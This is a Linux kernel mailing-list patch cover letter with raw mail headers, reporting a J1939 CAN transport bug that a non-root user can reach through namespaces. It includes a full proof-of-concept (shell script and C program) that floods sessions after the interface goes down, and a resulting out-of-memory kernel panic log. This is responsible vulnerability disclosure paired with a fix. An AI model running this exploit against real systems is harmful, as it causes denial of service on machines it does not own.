Received: from mail-pj1-f49.google.com (mail-pj1-f49.google.com [209.85.216.49])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 8B1641A38F9
	for <linux-can@vger.kernel.org>; Sat, 29 Aug 2026 06:10:15 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.216.49
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1787983817; cv=none; b=EN6wd6lISu2ZWfhk+/fG7794a5HLzAKtLFb9mlq0s5S7JaAn+KgP3M0XJMoPiAU5f0Ksw/gT4xJw07MnvRRHu/H8mrtXLpN40+wQqsr6JIeTmKvxcUxgB54UJkdOHdvpIhi64zoknX5bj1DIuRzkr4rbfxXs7yc1XgbvWN52g5s=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1787983817; c=relaxed/simple;
	bh=hg0ZwERkaalufbkSvawMtz09931QSp5JdqLmuKjcryk=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=M/g3dGMSeHkHErubMlmiMfNBPKPuyYVqpyoCvwCr5zxvCnk3EM62o2RKSOF+SMoq0drf0SFAHwwRuqaPIezOnQOmlpJ4sfVg2X7o3/v1nucdFy9Fun2oGMwdo+0ykyp1i7PDmYFbY2GVLQ/Os0KnRsZmCMKuEo8uASeT9loVqO8=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=BNCGVUbq; arc=none smtp.client-ip=209.85.216.49
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="BNCGVUbq"
Received: by mail-pj1-f49.google.com with SMTP id 98e67ed59e1d1-3964dfb5b9aso1776300a91.1
        for <linux-can@vger.kernel.org>; Fri, 28 Aug 2026 23:10:15 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1787983815; x=1788588615; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=l73bzv9UNzvL8IpIKNZY8hrChlPyqIR+YHJq/sjOtYM=;
        b=BNCGVUbqorZTOEw9YgTFs7r2hodnYHeabPLB2X2NyKTTKYsilLsayWmresbR6qLO8Y
         1xvdrU3GPthtGKWEldZ4MAFXyx5ARNe8nO/Zx6TzfyqKo644JFKNa1eYxcid1TxYK7yu
         WLMj+F5iKQw1CJzr0wFJDtadFmpSfMPbkbsB68Y3sICplQO1h6fiFhgXeU2bMOtFlUyE
         3kCn8iMg7eWvu4f5d5d5KgRFrjXJqnHGvi0gB+2caaHzbhMaDLnZmy1Fd6bBA6gAAWev
         mKNcPd6+lCGG/CqMRFgG5wIS5lGgPUBmXkcChlpJvKL0s/lUDOxBX0WrWMAUr9uy4H3Z
         2uQA==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1787983815; x=1788588615;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=l73bzv9UNzvL8IpIKNZY8hrChlPyqIR+YHJq/sjOtYM=;
        b=hTV09OurmU03peFtuR1izX1fUFcsvm22Y+BSpQFyignFrps41VcwzoLdOjCDNxwJBv
         mUAf0qqdMMh/vK34/kJn4cZblA+oIyKlGBdpIMC6Z5icsMMpHa6QZrrjNQwJCMT0HK56
         eOduBuByvkLb5iov1Tc6sWTiO5QYqF6Qs49rCj7NnMf9p68UyVsWrDivKl6/y3epyIDG
         0RFAdh14oisecouEUg9GWApPLVHipBSSABtYrt/7VdVS1z+UVSyVifkNGFWENFSWLqqT
         QQBqFneZc4JbfKTDVL5ULDi+8/Q4JtYnGxuWV3m9BMXE/Iy9sKORndC0osKcxHB4rpKD
         7Epg==
X-Gm-Message-State: AFuF++mvCHZE5Ph7p1Y/6B9Qm3bt3EXVBdWQY5wyEvRCx9eM1okzaXVY
	pb4t47BfLFIMoNlQdQ5IDMxe2HruKQQSpQt91RDSfAOoCo6f9UMHCW4XPRHXGZKpvq0fNwsQgLY
	2+v3ybVRT4IQ=
X-Gm-Gg: AYBFou0ELrCqaDLXYPavjclnlp7K33DItXkitRtbQn1DDJUlkL5TLTGp3DhUI4kQrCi
	SAqsKptlNnEWl92aAy3mraceZlYLJrpbcV4O+n7p/qOwz5Op8qcgu7nH0Owi2hEgEP7KxbLcW2N
	Uzu9+RAxsPL3V120gGQglyekwDuUwjyTTcLRMbSF7qfTVI7u4FIkrrQdsDxqeNsVy7DpLSn2bRs
	KgwBgRQfF54Xcdzl4EjhI+7bXCzROkk/14lgMzmregQo2vq0/9puWCl722YJ9v5RoqR3VlpsLDf
	3HSawNPJS470RI0AUYbKM0JzKx3003rjH9uRNJuqQ/MeUef6EWbz3thw4/zbS/Rr3TBnPGFdLzA
	vhiPc5rzUSJksqswu6BcGoPCXU7zSWRifmIYvtSo/R9i0m3zTnjCm41xDSByFMn5/0jxys1wwnf
	Bje1aKPkDRRSpdhJv50kMDwsuIl5GLiTz6nBOaCQyaVuKg0Cz9U+O0hoGKHTZZgauATnFtrTnjB
	WoiM/Vm
X-Received: by 2002:a17:90b:4a90:b0:38d:b36e:9813 with SMTP id 98e67ed59e1d1-396d0f8e9f9mr20160288a91.11.1787983814488;
        Fri, 28 Aug 2026 23:10:14 -0700 (PDT)
Received: from Roxy.localdomain ([2602:feda:30:ae86:295:dff:fe84:68f4])
        by smtp.gmail.com with ESMTPSA id 5a478bee46e88-3286f99585csm11144869eec.21.2026.08.28.23.10.10
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Fri, 28 Aug 2026 23:10:13 -0700 (PDT)
From: Zhiling Zou <zhilinz@nebusec.ai>
To: linux-can@vger.kernel.org
Cc: robin@protonic.nl,
	o.rempel@pengutronix.de,
	kernel@pengutronix.de,
	socketcan@hartkopp.net,
	mkl@pengutronix.de,
	maxime.jayat@mobile-devices.fr,
	lkp@intel.com,
	ecathinds@gmail.com,
	vega@nebusec.ai,
	zhilinz@nebusec.ai
Subject: [PATCH net 0/1] can: j1939: reject activation when device is down
Date: Sat, 29 Aug 2026 14:09:59 +0800
Message-ID: <cover.1787982820.git.zhilinz@nebusec.ai>
X-Mailer: git-send-email 2.43.0
Precedence: bulk
X-Mailing-List: linux-can@vger.kernel.org
List-Id: <linux-can.vger.kernel.org>
List-Subscribe: <mailto:linux-can+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-can+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi Linux kernel maintainers,

We found and validated an issue in net/can/j1939/transport.c. The bug is
reachable by a non-root user via user and net namespace.
We've tested it, and it should not affect any other functionality.

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.

---- details below ----

Bug details:

NETDEV_DOWN clears IFF_UP before notifying J1939. Its notifier cancels
the active sessions and drops socket queues, but a socket that was bound
while the interface was up can send a new transport session after that
cleanup.

The device remains NETREG_REGISTERED while it is down, so
j1939_session_activate() puts that session on active_session_list. Its
transmit timer later gets -ENETDOWN from j1939_send_one(). That timer
deliberately relies on the already-run NETDEV_DOWN notifier to do cleanup.
The session is therefore retained with its skb, socket, private context,
and netdev references; skb_pending stays nonzero and close can block.

The active-session lock already makes activations that precede NETDEV_DOWN
visible to cancellation. Rejecting activation when IFF_UP is clear handles
activations after the flag transition. The existing failure path removes
the queued session.

Reproducer:

    ./poc.sh userns-observe

For an OOM panic with the supplied configuration:

    sudo ./poc.sh root-crash

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN Makefile------

CC ?= gcc
CFLAGS ?= -O2 -Wall -Wextra

all: poc

poc: poc.c
	$(CC) $(CFLAGS) -o $@ $<

clean:
	rm -f poc

------END Makefile--------

------BEGIN poc.sh------

#!/bin/sh
set -eu

MODE="${1:-root-crash}"
DIR="$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)"
BIN="$DIR/poc"

if [ ! -x "$BIN" ]; then
	make -C "$DIR"
fi

setup_vcan() {
	ip link del vcan0 2>/dev/null || true
	ip link add dev vcan0 type vcan
	ip link set dev vcan0 up
}

case "$MODE" in
root-crash)
	if [ "$(id -u)" -ne 0 ]; then
		echo "root-crash mode must run as root" >&2
		exit 1
	fi
	setup_vcan
	echo 2 > /proc/sys/vm/panic_on_oom
	exec "$BIN" vcan0 150 5 4194304 67108864 -1 1
	;;
userns-observe)
	if [ "$(id -u)" -eq 0 ]; then
		echo "run userns-observe as an unprivileged user" >&2
		exit 1
	fi
	exec unshare -Urn sh -c '
		set -eu
		ip link add dev vcan0 type vcan
		ip link set dev vcan0 up
		timeout 3s "'"$BIN"'" vcan0 1 1 9 0 0 0 || true
	'
	;;
*)
	echo "usage: $0 [root-crash|userns-observe]" >&2
	exit 1
	;;
esac

------END poc.sh--------

------BEGIN poc.c------

#define _GNU_SOURCE

#include <errno.h>
#include <linux/can.h>
#include <linux/can/j1939.h>
#include <linux/sockios.h>
#include <net/if.h>
#include <signal.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>

#ifndef SO_SNDBUFFORCE
#define SO_SNDBUFFORCE 32
#endif

struct opts {
	const char *ifname;
	int sock_count;
	int send_rounds;
	int payload_len;
	int sndbuf;
	int close_index;
	bool keep_open;
};

static void die(const char *what)
{
	perror(what);
	exit(1);
}

static int run_cmd(const char *cmd)
{
	int ret;

	fprintf(stderr, "[*] %s\n", cmd);
	ret = system(cmd);
	if (ret != 0)
		fprintf(stderr, "[!] command failed: rc=%d\n", ret);
	return ret;
}

static int set_sndbuf(int fd, int sndbuf)
{
	if (sndbuf <= 0)
		return 0;

	if (setsockopt(fd, SOL_SOCKET, SO_SNDBUFFORCE, &sndbuf, sizeof(sndbuf)) == 0)
		return 0;

	if (errno == EPERM &&
	    setsockopt(fd, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf)) == 0)
		return 0;

	return -1;
}

static int clear_so_error(int fd)
{
	int soerr = 0;
	socklen_t len = sizeof(soerr);

	if (getsockopt(fd, SOL_SOCKET, SO_ERROR, &soerr, &len) < 0)
		return -1;

	return soerr;
}

static void bind_one(int fd, int ifindex, uint8_t sa)
{
	struct sockaddr_can addr;

	memset(&addr, 0, sizeof(addr));
	addr.can_family = AF_CAN;
	addr.can_ifindex = ifindex;
	addr.can_addr.j1939.name = J1939_NO_NAME;
	addr.can_addr.j1939.addr = sa;
	addr.can_addr.j1939.pgn = J1939_NO_PGN;

	if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0)
		die("bind");
}

static ssize_t send_one(int fd, int ifindex, uint8_t da, pgn_t pgn,
			const void *buf, size_t len)
{
	struct sockaddr_can dst;

	memset(&dst, 0, sizeof(dst));
	dst.can_family = AF_CAN;
	dst.can_ifindex = ifindex;
	dst.can_addr.j1939.name = J1939_NO_NAME;
	dst.can_addr.j1939.addr = da;
	dst.can_addr.j1939.pgn = pgn;

	return sendto(fd, buf, len, 0, (struct sockaddr *)&dst, sizeof(dst));
}

static int ifindex_by_name(const char *ifname)
{
	unsigned int idx = if_nametoindex(ifname);

	if (!idx) {
		errno = ENODEV;
		die("if_nametoindex");
	}

	return (int)idx;
}

static void parse_opts(struct opts *opts, int argc, char **argv)
{
	if (argc < 5) {
		fprintf(stderr,
			"usage: %s <ifname> <sock_count> <send_rounds> <payload_len> [sndbuf] [close_index] [keep_open]\n",
			argv[0]);
		exit(1);
	}

	opts->ifname = argv[1];
	opts->sock_count = atoi(argv[2]);
	opts->send_rounds = atoi(argv[3]);
	opts->payload_len = atoi(argv[4]);
	opts->sndbuf = argc > 5 ? atoi(argv[5]) : 0;
	opts->close_index = argc > 6 ? atoi(argv[6]) : -1;
	opts->keep_open = argc > 7 ? atoi(argv[7]) != 0 : true;

	if (opts->sock_count <= 0 || opts->sock_count > 238) {
		fprintf(stderr, "invalid sock_count: %d\n", opts->sock_count);
		exit(1);
	}
	if (opts->send_rounds <= 0 || opts->send_rounds > 1000000) {
		fprintf(stderr, "invalid send_rounds: %d\n", opts->send_rounds);
		exit(1);
	}
	if (opts->payload_len < 9) {
		fprintf(stderr, "invalid payload_len: %d\n", opts->payload_len);
		exit(1);
	}
	if (opts->close_index >= opts->sock_count) {
		fprintf(stderr, "invalid close_index: %d\n", opts->close_index);
		exit(1);
	}
}

int main(int argc, char **argv)
{
	struct opts opts;
	int *fds;
	char *payload;
	int ifindex;
	int i, round;
	unsigned long long total_ok = 0;
	char cmd[256];

	parse_opts(&opts, argc, argv);
	ifindex = ifindex_by_name(opts.ifname);

	payload = malloc(opts.payload_len);
	if (!payload)
		die("malloc payload");
	memset(payload, 'A', opts.payload_len);

	fds = calloc((size_t)opts.sock_count, sizeof(*fds));
	if (!fds)
		die("calloc fds");

	for (i = 0; i < opts.sock_count; i++) {
		int one = 1;
		uint8_t sa = (uint8_t)(0x10 + i);

		fds[i] = socket(PF_CAN, SOCK_DGRAM, CAN_J1939);
		if (fds[i] < 0)
			die("socket");
		if (setsockopt(fds[i], SOL_SOCKET, SO_BROADCAST, &one, sizeof(one)) < 0)
			die("SO_BROADCAST");
		if (set_sndbuf(fds[i], opts.sndbuf) < 0)
			die("SO_SNDBUF");
		bind_one(fds[i], ifindex, sa);
	}

	fprintf(stderr,
		"[*] bound %d sockets on %s, bringing interface down before send\n",
		opts.sock_count, opts.ifname);
	snprintf(cmd, sizeof(cmd), "ip link set dev %s down", opts.ifname);
	if (run_cmd(cmd) != 0)
		die("ip link down");

	for (i = 0; i < opts.sock_count; i++) {
		int soerr = clear_so_error(fds[i]);

		if (soerr < 0)
			die("SO_ERROR");
		if (soerr)
			fprintf(stderr, "[*] cleared SO_ERROR=%d on socket %d\n",
				soerr, i);
	}

	for (round = 0; round < opts.send_rounds; round++) {
		fprintf(stderr, "[*] send round %d/%d\n",
			round + 1, opts.send_rounds);
		for (i = 0; i < opts.sock_count; i++) {
			uint8_t da = (uint8_t)(0x80 + (i % 64));
			pgn_t pgn = 0x12000 + (round % 0x100);
			ssize_t ret;

			ret = send_one(fds[i], ifindex, da, pgn, payload,
				       (size_t)opts.payload_len);
			if (ret < 0) {
				fprintf(stderr,
					"[!] send failed: round=%d socket=%d errno=%d (%s)\n",
					round, i, errno, strerror(errno));
				goto done;
			}
			total_ok++;
			if ((total_ok % 100) == 0)
				fprintf(stderr, "[*] successful sends: %llu\n", total_ok);
		}
	}

done:
	fprintf(stderr,
		"[*] completed %llu successful sends after NETDEV_DOWN on %s\n",
		total_ok, opts.ifname);

	if (opts.close_index >= 0) {
		fprintf(stderr, "[*] closing socket %d\n", opts.close_index);
		close(fds[opts.close_index]);
		fprintf(stderr, "[*] close returned on socket %d\n", opts.close_index);
	}

	if (opts.keep_open) {
		for (;;)
			pause();
	}

	for (i = 0; i < opts.sock_count; i++)
		close(fds[i]);

	free(fds);
	free(payload);
	return 0;
}

------END poc.c--------

----BEGIN crash log----

[  779.844553][T10861] Kernel panic - not syncing: Out of memory: compulsory panic_on_oom is enabled
[  779.845328][T10861] CPU: 0 UID: 0 PID: 10861 Comm: poc Not tainted 6.12.95 #2
[  779.845818][T10861] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[  779.846644][T10861] Call Trace:
[  779.846875][T10861]  <TASK>
[  779.847092][T10861]  panic+0x533/0x610
[  779.847380][T10861]  ? dump_header+0x5d2/0x800
[  779.847698][T10861]  ? __pfx_panic+0x10/0x10
[  779.848069][T10861]  out_of_memory+0x73c/0x1430
[  779.848396][T10861]  ? __alloc_pages_noprof+0xd53/0x26d0
[  779.848766][T10861]  ? __pfx_out_of_memory+0x10/0x10
[  779.849123][T10861]  ? lock_acquire+0x2f/0xb0
[  779.849429][T10861]  ? __alloc_pages_noprof+0xd53/0x26d0
[  779.849815][T10861]  __alloc_pages_noprof+0x1ecc/0x26d0
[  779.850196][T10861]  ? trace_lock_acquire+0x145/0x1c0
[  779.850571][T10861]  ? __pfx___alloc_pages_noprof+0x10/0x10
[  779.850973][T10861]  ? srso_alias_return_thunk+0x5/0xfbef5
[  779.851366][T10861]  ? srso_alias_return_thunk+0x5/0xfbef5
[  779.851741][T10861]  ? srso_alias_return_thunk+0x5/0xfbef5
[  779.852130][T10861]  ? __pfx_mark_lock+0x10/0x10
[  779.852485][T10861]  ? srso_alias_return_thunk+0x5/0xfbef5
[  779.852871][T10861]  ? stack_trace_save+0x9a/0xd0
[  779.853224][T10861]  alloc_pages_mpol_noprof+0x1ab/0x4d0
[  779.853606][T10861]  ? __pfx_alloc_pages_mpol_noprof+0x10/0x10
[  779.854034][T10861]  ? alloc_skb_with_frags+0xc2/0x820
[  779.854387][T10861]  ? sock_alloc_send_pskb+0x687/0x820
[  779.854738][T10861]  ? j1939_sk_sendmsg+0x5bf/0x1260
[  779.855097][T10861]  ? __sys_sendto+0x349/0x3a0
[  779.855422][T10861]  ? __x64_sys_sendto+0xe0/0x1c0
[  779.855764][T10861]  new_slab+0x303/0x420
[  779.856073][T10861]  ___slab_alloc+0xe60/0x19e0
[  779.856393][T10861]  ? srso_alias_return_thunk+0x5/0xfbef5
[  779.856772][T10861]  ? __alloc_skb+0x114/0x2e0
[  779.857150][T10861]  ? __print_lock_name+0x1d1/0x260
[  779.857527][T10861]  ? srso_alias_return_thunk+0x5/0xfbef5
[  779.857948][T10861]  ? __alloc_skb+0x114/0x2e0
[  779.858268][T10861]  ? __slab_alloc.isra.0+0x5b/0xb0
[  779.858615][T10861]  ? srso_alias_return_thunk+0x5/0xfbef5
[  779.859001][T10861]  __slab_alloc.isra.0+0x5b/0xb0
[  779.859339][T10861]  __kmalloc_node_track_caller_noprof+0x322/0x430
[  779.860062][T10861]  ? __alloc_skb+0x114/0x2e0
[  779.860396][T10861]  kmalloc_reserve+0xc0/0x240
[  779.860726][T10861]  __alloc_skb+0x114/0x2e0
[  779.861039][T10861]  ? __pfx___alloc_skb+0x10/0x10
[  779.861398][T10861]  alloc_skb_with_frags+0xc2/0x820
[  779.861735][T10861]  ? srso_alias_return_thunk+0x5/0xfbef5
[  779.862135][T10861]  ? mark_lock+0xb5/0xc60
[  779.862436][T10861]  ? lock_acquire+0x2f/0xb0
[  779.862769][T10861]  sock_alloc_send_pskb+0x687/0x820
[  779.863150][T10861]  ? srso_alias_return_thunk+0x5/0xfbef5
[  779.863578][T10861]  ? srso_alias_return_thunk+0x5/0xfbef5
[  779.863968][T10861]  ? find_held_lock+0x2d/0x110
[  779.864318][T10861]  ? __pfx_sock_alloc_send_pskb+0x10/0x10
[  779.864711][T10861]  ? __pfx_lock_release+0x10/0x10
[  779.865085][T10861]  ? srso_alias_return_thunk+0x5/0xfbef5
[  779.865465][T10861]  ? mark_held_locks+0x94/0xe0
[  779.865833][T10861]  ? _raw_spin_unlock_irqrestore+0x57/0x80
[  779.866284][T10861]  j1939_sk_sendmsg+0x5bf/0x1260
[  779.866655][T10861]  ? __pfx_j1939_sk_sendmsg+0x10/0x10
[  779.867033][T10861]  ? __pfx_j1939_sk_sendmsg+0x10/0x10
[  779.867429][T10861]  __sys_sendto+0x349/0x3a0
[  779.867744][T10861]  ? __pfx___sys_sendto+0x10/0x10
[  779.868128][T10861]  ? __might_fault+0xb6/0x120
[  779.868478][T10861]  ? __pfx___rseq_handle_notify_resume+0x10/0x10
[  779.868937][T10861]  __x64_sys_sendto+0xe0/0x1c0
[  779.869339][T10861]  ? do_syscall_64+0x93/0x270
[  779.869657][T10861]  ? srso_alias_return_thunk+0x5/0xfbef5
[  779.870044][T10861]  ? lockdep_hardirqs_on+0x7b/0x110
[  779.870405][T10861]  do_syscall_64+0xc7/0x270
[  779.870721][T10861]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[  779.871119][T10861] RIP: 0033:0x7f623a490687
[  779.871419][T10861] Code: 48 89 fa 4c 89 df e8 58 b3 00 00 8b 93 08 03 00 00 59 5e 48 83 f8 fc 74 1a 5b c3 0f 1f 84 00 00 00 00 00 48 8b 44 24 10 0f 05 <5b> c3 0f 1f 80 00 00 00 00 83 e2 39 83 fa 08 75 de e8 23 ff ff ff
[  779.872690][T10861] RSP: 002b:00007fffa4cf9c10 EFLAGS: 00000202 ORIG_RAX: 000000000000002c
[  779.873257][T10861] RAX: ffffffffffffffda RBX: 00007f623a3fe740 RCX: 00007f623a490687
[  779.873779][T10861] RDX: 0000000000400000 RSI: 00007f6239ffd010 RDI: 000000000000003e
[  779.874307][T10861] RBP: 0000000000012000 R08: 00007fffa4cf9cb0 R09: 0000000000000018
[  779.874831][T10861] R10: 0000000000000000 R11: 0000000000000202 R12: 000000000000003b
[  779.875373][T10861] R13: 000000000000003b R14: 00007fffa4cf9cb0 R15: 0000000000000096
[  779.875920][T10861]  </TASK>
[  779.876733][T10861] Kernel Offset: disabled
[  779.877120][T10861] Rebooting in 86400 seconds..

-----END crash log-----

Best regards,
Zhiling Zou

Zhiling Zou (1):
  can: j1939: reject activation when device is down

 net/can/j1939/transport.c | 3 ++-
 1 file changed, 2 insertions(+), 1 deletion(-)

-- 
2.43.0
